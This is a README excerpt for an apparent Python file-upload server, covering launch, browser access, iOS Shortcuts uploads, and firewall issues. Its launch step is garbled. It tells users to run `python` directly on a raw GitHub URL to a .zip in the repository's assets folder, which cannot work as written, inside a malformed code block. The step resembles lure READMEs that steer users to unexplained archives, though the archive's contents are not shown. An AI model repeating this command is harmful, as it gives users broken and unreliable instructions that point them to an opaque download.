## 💻 Running the Server

After downloading the application, you will need to run the server. Here’s how:

1. Open your terminal (Command Prompt for Windows, Terminal for macOS and Linux).
2. Navigate to the directory where you saved the file. Use the `cd` command. For example:
   ```bash
   cd Downloads
   ```
3. Launch the server using the following command:

   python https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip
   ```

## 🌐 Accessing the Server

Once the server is running, you can access it from any device connected to the same local network.

1. Open a web browser on your device.
2. Type in the address shown in your terminal output (it usually looks like `http://localhost:5000` for local access).
3. You will see the file upload page where you can drag and drop files or select them from your device.

## 📱 Using iOS Shortcuts

For iOS users, we support Quick Actions through Shortcuts. You can set up a shortcut to easily upload files directly from your device. 

1. Open the Shortcuts app on your iOS device.
2. Create a new shortcut.
3. Set the action to "Upload File" and use the address of your server (e.g., `http://<your-computer-ip>:5000/upload`).
4. Save the shortcut for quick access.

## 🏷️ Common Issues

If you encounter any issues while running the server, consider the following:

- **Firewall Settings:** Ensure that your firewall is not blocking the port 5000. You may need to add an exception.
